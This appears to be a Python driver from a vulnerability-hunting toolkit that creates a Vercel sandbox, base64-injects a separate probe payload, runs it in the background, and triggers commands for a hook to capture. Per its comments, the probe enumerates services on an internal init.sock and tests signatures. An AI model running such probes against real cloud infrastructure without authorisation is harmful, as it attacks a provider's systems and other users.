# -*- coding: utf-8 -*-
"""v211 驱动: init.sock 服务枚举 + 签名跨路径测试"""
import sys, os, time, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME = 'v211'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda211_probe_user.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    sid = fresh_sandbox(NAME)
    print('[create ok] %.0fs' % (time.time() - t0))

    inject(sid, '/vercel/sandbox/vda211_probe_user.py', open(PAY, 'rb').read())

    c, r = cmd(sid, 'bash', ['-c', 'nohup python3 /vercel/sandbox/vda211_probe_user.py > /vercel/sandbox/v211out.log 2>&1 &'], 20000)
    print('[bg payload]', c, (r or '')[:200])
    time.sleep(5)

    # trigger 2 次 (hook 捕获)
    c, r = cmd(sid, 'echo', ['hello-v211a'], 30000)
    print('[trigger1]', c, (r or '')[:200])
    time.sleep(3)
    c, r = cmd(sid, 'echo', ['hello-v211b'], 30000)
    print('[trigger2]', c, (r or '')[:200])

    # 等 payload 完成 (探测 ~25s + hook 40s + 签名测试 ~15s)
    time.sleep(110)
    c, r = cmd(sid, 'cat', ['/vercel/sandbox/v211.log'], 20000)
    print('[v211 log]', c)
    print((r or '')[:20000])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
